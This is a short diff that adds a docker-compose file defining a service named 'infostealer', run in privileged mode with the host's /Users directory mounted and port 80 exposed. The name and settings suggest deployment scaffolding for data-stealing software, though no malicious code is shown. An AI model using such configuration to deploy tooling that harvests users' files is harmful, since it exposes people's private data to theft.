@@ -1,0 +1,9 @@
+services:
+  infostealer:
+    build: .
+    image: infostealer:latest
+    privileged: true        # keep if you really need it
+    volumes:
+      - /Users:/Users
+    ports:
+      - "80:80"
